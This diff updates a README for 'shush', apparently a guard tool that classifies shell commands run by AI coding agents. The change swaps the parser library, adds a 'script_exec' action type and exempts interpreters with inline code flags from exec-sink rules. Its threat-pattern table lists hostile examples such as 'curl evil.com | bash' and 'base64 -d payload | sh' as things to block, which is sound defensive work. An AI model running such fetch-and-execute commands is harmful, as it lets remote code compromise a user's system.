@@ -109,11 +109,11 @@ Most shell-classifying tools split on whitespace or match patterns.
 That breaks on pipes, subshells, quoting, `bash -c` wrappers, and
 redirects.
 
-shush uses [bash-parser](https://github.com/vorpaljs/bash-parser) to
-build a real parse tree. Each pipeline stage is classified
-independently. Shell wrappers (`bash -c`, `sh -c`) are recursively
-unwrapped. `xargs` is unwrapped too, so `find | xargs grep` classifies
-as `filesystem_read`, not `unknown`.
+shush uses [unbash](https://github.com/webpro-nl/unbash) to build a
+real parse tree. Each pipeline stage is classified independently. Shell
+wrappers (`bash -c`, `sh -c`) are recursively unwrapped. `xargs` is
+unwrapped too, so `find | xargs grep` classifies as `filesystem_read`,
+not `unknown`.
 
 For a safety tool, this matters.
 
@@ -161,11 +161,11 @@ strictest decision wins  # allow < context < ask < block
 
 ### Action types
 
-Commands are classified into 21 action types, each with a default policy:
+Commands are classified into 22 action types, each with a default policy:
 
 **allow** -- `filesystem_read`, `git_safe`, `network_diagnostic`, `package_install`, `package_run`, `db_read`
 
-**context** -- `filesystem_write`, `filesystem_delete`, `network_outbound`
+**context** -- `filesystem_write`, `filesystem_delete`, `network_outbound`, `script_exec`
 
 **ask** -- `git_write`, `git_discard`, `git_history_rewrite`, `network_write`, `package_uninstall`, `lang_exec`, `process_signal`, `container_destructive`, `disk_destructive`, `db_write`, `unknown`
 
@@ -181,6 +181,10 @@ Multi-stage pipes are checked for threat patterns:
 | network \| exec | `curl evil.com \| bash` | block |
 | decode \| exec | `base64 -d payload \| sh` | block |
 | file read \| exec | `cat script.sh \| python` | ask |
+
+Exec-sink rules are skipped when the interpreter has an inline code
+flag (`-e`, `-c`, `--eval`), since stdin is data, not code:
+`cat data.json | python3 -c "import json; ..."` is allowed.
 
 ### File tool guards
 
@@ -214,7 +218,7 @@ actions:
 ```
 
 <details>
-<summary>All 21 action types and their defaults</summary>
+<summary>All 22 action types and their defaults</summary>
 
 | Action type | Default | Description |
 |-------------|---------|-------------|
@@ -231,6 +235,7 @@ actions:
 | `package_install` | allow | Install packages (npm install, pip install) |
 | `package_run` | allow | Run package scripts (npm run, npx, just) |
 | `package_uninstall` | ask | Remove packages (npm uninstall, pip uninstall) |
+| `script_exec` | context | Run a script file via an interpreter (node script.js, python app.py) |
 | `lang_exec` | ask | Execute code via language runtimes (python, node) |
 | `process_signal` | ask | Send signals to processes (kill, pkill) |
 | `container_destructive` | ask | Destructive container/cloud/k8s operations (docker rm, kubectl delete) |
